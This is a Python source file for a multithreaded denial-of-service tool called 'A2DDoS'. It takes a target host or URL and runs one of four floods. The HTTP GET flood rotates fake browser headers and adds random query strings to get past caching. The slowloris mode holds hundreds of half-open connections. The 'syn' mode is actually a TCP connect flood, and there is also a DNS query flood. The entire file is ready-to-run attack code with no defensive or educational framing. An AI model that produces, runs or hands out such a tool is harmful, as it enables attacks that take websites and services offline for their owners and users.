import requests, threading, random, sys, time, signal, socket, argparse

running = True
stats = {"sent": 0, "connections": 0}
lock = threading.Lock()

def handler(s, f):
    global running
    running = False
signal.signal(signal.SIGINT, handler)

UA = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; rv:97.0) Gecko/20100101 Firefox/97.0",
]
REF = ["https://google.com/", "https://facebook.com/", "https://duckduckgo.com/"]

def http(url, t=50):
    def f():
        while running:
            try:
                h = {"User-Agent": random.choice(UA), "Referer": random.choice(REF)}
                requests.get(url + f"?{random.randint(100,999)}", headers=h, timeout=5)
                with lock: stats["sent"] += 1
            except: pass
    for _ in range(t): threading.Thread(target=f, daemon=True).start()
    return stats

def slowloris(url, m=500):
    r = url.replace("http://","").replace("https://","").split("/")[0]
    h = r.split(":")[0]; p = int(r.split(":")[1]) if ":" in r else 80
    socks = []
    def c():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4); s.connect((h, p))
            s.send(f"GET /?{random.randint(0,9999)} HTTP/1.1\r\nHost: {h}\r\n".encode())
            return s
        except: return None
    def w():
        while running:
            with lock:
                for s in socks[:]:
                    try: s.send(f"X-a: {random.randint(1,9999)}\r\n".encode())
                    except: socks.remove(s)
                while len(socks) < m and running:
                    s = c()
                    if s: socks.append(s)
                stats["connections"] = len(socks)
            time.sleep(5)
    for _ in range(20): threading.Thread(target=w, daemon=True).start()
    return stats

def syn(url, t=30):
    r = url.replace("http://","").replace("https://","").split("/")[0]
    h = r.split(":")[0]; p = int(r.split(":")[1]) if ":" in r else 80
    def f():
        while running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2); s.connect((h, p)); s.close()
                with lock: stats["sent"] += 1
            except: pass
    for _ in range(t): threading.Thread(target=f, daemon=True).start()
    return stats

def dns(url, t=20):
    import struct
    h = url.replace("http://","").replace("https://","").split("/")[0].split(":")[0]
    def f():
        tid = random.randint(0,65535)
        q = struct.pack(">H", tid) + b"\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
        q += b"\x07example\x03com\x00\x00\x01\x00\x01"
        while running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.settimeout(1); s.sendto(q, (h, 53))
                with lock: stats["sent"] += 1
            except: pass
    for _ in range(t): threading.Thread(target=f, daemon=True).start()
    return stats

p = argparse.ArgumentParser(description="A2DDoS — Made by Ayush Rajdev")
p.add_argument("target", help="IP or URL")
p.add_argument("mode", nargs="?", default="http", choices=["http","slowloris","syn","dns"])
p.add_argument("--t", type=int, default=50, help="Threads")
p.add_argument("--c", type=int, default=500, help="Max conns (slowloris)")
a = p.parse_args()

url = a.target if a.target.startswith("http") else "http://" + a.target
modes = {"http": http, "slowloris": slowloris, "syn": syn, "dns": dns}
m = a.mode

print(f"[{m}] -> {url}  (Ctrl+C to stop)")
print("=" * 35)
start = time.time()
modes[m](url, a.t if m != "slowloris" else a.c)
try:
    while running:
        e = time.time() - start or 0.001
        n = stats.get("connections", stats["sent"])
        l = "Conns" if m in ("slowloris","dns") else "Sent"
        if m in ("slowloris","dns"):
            print(f"{l}: {n}  |  {e:.0f}s", end="\r")
        else:
            print(f"Sent: {stats['sent']}  |  RPS: {stats['sent']/e:.0f}  |  {e:.0f}s", end="\r")
        time.sleep(0.5)
except: pass
e = time.time() - start
n = stats.get("connections", stats["sent"])
l = "Conns" if m in ("slowloris","dns") else "Sent"
print(f"\nDone. {l}: {n} in {e:.0f}s")
